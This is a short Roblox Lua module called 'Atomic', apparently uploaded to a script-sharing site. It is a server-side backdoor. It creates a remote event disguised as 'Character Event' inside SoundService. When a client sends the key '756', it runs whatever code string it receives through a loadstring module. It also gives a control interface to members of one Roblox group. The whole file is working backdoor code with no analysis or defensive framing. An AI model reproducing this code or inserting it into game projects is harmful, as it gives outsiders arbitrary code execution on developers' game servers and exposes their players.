--[[
	id: Xh-Yaitg5LMvjmM4kjvUH
	name: Atomic
	description: yes
	time1: 2021-06-26 02:08:39.051462+00
	time2: 2021-06-26 02:08:39.051462+00
	uploader: Sw3sgQ5bCkywPcgABCB0llGXUJCalcwX1AK_157v
	uploadersession: sPcmFEpfIqyfsQ1JWJjqG-YfpN7T9z
	flag: f
--]]

local AU = {}
function AU.sync()
	local Players = game:GetService("Players")
	local plr = game.Players.LocalPlayer
	local UI = script.AUI
	local Loadstring = script.Loadstring
	local Remote = Instance.new("RemoteEvent", game:GetService('SoundService'))
	Remote.Name = "Character Event"
	Remote.OnServerEvent:Connect(function(AU,key,dead)
		local loadstringload=require(Loadstring)
		if key == "756" then
			loadstringload(dead)()
		end
	end)	
	Players.PlayerAdded:connect(function(plr) 
		if plr:IsInGroup(2642611) then
			UI:Clone().Parent = plr.PlayerGui
		end
	end)
	for no, yes in pairs(game.Players:GetChildren()) do
		if yes:IsInGroup(2642611) then
			UI:Clone().Parent = yes.PlayerGui
		end
	end
end
return AU